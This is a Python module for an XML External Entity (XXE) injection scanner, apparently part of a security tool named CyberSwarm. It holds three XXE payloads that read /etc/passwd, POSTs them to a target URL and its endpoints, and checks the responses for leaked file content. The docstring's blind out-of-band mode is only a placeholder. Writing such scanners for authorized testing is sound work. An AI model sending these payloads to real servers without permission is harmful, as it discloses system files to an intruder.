"""
XXE_SCAN -- XML External Entity injection testing.

Sends crafted XML payloads to detect:
  1. Error-based XXE  (file read via error message)
  2. Blind XXE        (OOB data exfiltration via external DTD)
  3. Parameter entity (XXE via DOCTYPE parameter entities)

Pure Python + curl fallback.  Non-destructive: reads /etc/passwd only.
"""

import re
import ssl
import urllib.error
import urllib.request
from typing import Any, Dict, List

from tools.base import Tool, ToolResult

# ── Payload templates ──────────────────────────────────────────────────────

# Error-based: the server reflects the file contents in an error message
ERROR_BASED_PAYLOAD = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

# Parameter entity variant (some parsers block direct entities but allow %)
PARAM_ENTITY_PAYLOAD = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>"""

# CDATA variant (try to avoid entity expansion blocks)
CDATA_PAYLOAD = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>"""

OOB_DTD_MARKER = "CYBERSWARM_XXE_OOB"  # for blind XXE (placeholder)

# Regex that matches passwd-like content leaked in responses
PASSWD_PATTERNS = [
    re.compile(r"root:.+:0:0:", re.IGNORECASE),
    re.compile(r"/bin/(ba)?sh", re.IGNORECASE),
    re.compile(r"daemon:.+:\d+:\d+:", re.IGNORECASE),
]

# Regex for XML error messages that may reveal file contents
XML_ERROR_PATTERNS = [
    re.compile(r"javax\.xml\.parsers", re.IGNORECASE),
    re.compile(r"org\.xml\.sax", re.IGNORECASE),
    re.compile(r"com\.sun\.xml", re.IGNORECASE),
    re.compile(r"XML parsing error", re.IGNORECASE),
    re.compile(r"xml document", re.IGNORECASE),
]


class XXEScanTool(Tool):
    """XML External Entity injection scanner (pure Python, curl fallback)."""

    name = "xxe"
    capability = "XXE_SCAN"
    binary = ""

    def is_available(self) -> bool:
        return True

    def validate(self):
        return None

    def build_command(self, target: str, **kwargs) -> List[str]:
        return ["python-urllib-xxe", target]

    def parse(self, stdout: str, stderr: str) -> Dict[str, Any]:
        return {}

    def run(self, target: str, timeout: int = 60, **kwargs) -> ToolResult:
        url = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        endpoints = kwargs.get("endpoints") or []
        content_type = kwargs.get("content_type", "application/xml")

        # Always test the base URL, plus any discovered XML-ish endpoints
        test_urls = [url]
        for ep in endpoints[:8]:
            ep_url = ep if ep.startswith("http") else f"{url.rstrip('/')}/{ep.lstrip('/')}"
            if ep_url not in test_urls:
                test_urls.append(ep_url)

        all_findings = []
        for test_url in test_urls:
            for payload_label, payload in [
                ("error_based", ERROR_BASED_PAYLOAD),
                ("param_entity", PARAM_ENTITY_PAYLOAD),
                ("cdata", CDATA_PAYLOAD),
            ]:
                finding = self._send_payload(test_url, payload, payload_label, timeout, content_type)
                if finding:
                    all_findings.append(finding)
                    # If error-based works, skip other variants for this URL
                    break

        if not all_findings:
            return ToolResult(
                tool=self.name, status="success", capability=self.capability,
                results={"xxe_findings": [], "count": 0, "tested_urls": test_urls},
            )
        return ToolResult(
            tool=self.name, status="success", capability=self.capability,
            results={"xxe_findings": all_findings, "count": len(all_findings),
                     "tested_urls": test_urls},
        )

    @staticmethod
    def _send_payload(url: str, payload: str, variant: str,
                      timeout: int, content_type: str) -> Dict[str, Any] | None:
        """POST an XML payload and check for XXE indicators in the response."""
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (compatible; CyberSwarm-xxe/1.0)",
            "Accept": "application/xml, text/xml, */*",
        }
        data = payload.encode("utf-8", errors="replace")
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        ctx = ssl.create_default_context()

        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                status = resp.status
                body = resp.read(50000).decode("utf-8", errors="replace")
                resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        except urllib.error.HTTPError as e:
            status = e.code
            body = e.read(50000).decode("utf-8", errors="replace") if e.fp else ""
            resp_headers = {k.lower(): v for k, v in (e.headers or {}).items()}
        except Exception:  # noqa: BLE001
            return None

        full_text = f"{body}\n{resp_headers.get('x-error', '')}\n{resp_headers.get('server', '')}"

        # Check for passwd content in response (error-based XXE)
        for pat in PASSWD_PATTERNS:
            match = pat.search(full_text)
            if match:
                return {
                    "url": url,
                    "variant": variant,
                    "type": "error_based",
                    "severity": "CRITICAL",
                    "confidence": 90,
                    "evidence": match.group(0)[:200],
                    "description": f"XXE ({variant}) leaked file content at {url}",
                    "status_code": status,
                }

        # Check for XML parser error messages (may indicate partial XXE)
        for pat in XML_ERROR_PATTERNS:
            if pat.search(full_text) and status >= 400:
                return {
                    "url": url,
                    "variant": variant,
                    "type": "error_disclosure",
                    "severity": "MEDIUM",
                    "confidence": 45,
                    "evidence": full_text[:200],
                    "description": f"XML parser error disclosed at {url} — possible XXE",
                    "status_code": status,
                }

        # Check for parameter entity injection indicators
        if variant == "param_entity" and status == 200:
            # Some servers silently process param entities; check if content differs
            if "root:" in full_text or "/bin/" in full_text:
                return {
                    "url": url,
                    "variant": variant,
                    "type": "param_entity",
                    "severity": "CRITICAL",
                    "confidence": 85,
                    "evidence": full_text[:200],
                    "description": f"XXE via parameter entity at {url}",
                    "status_code": status,
                }

        return None
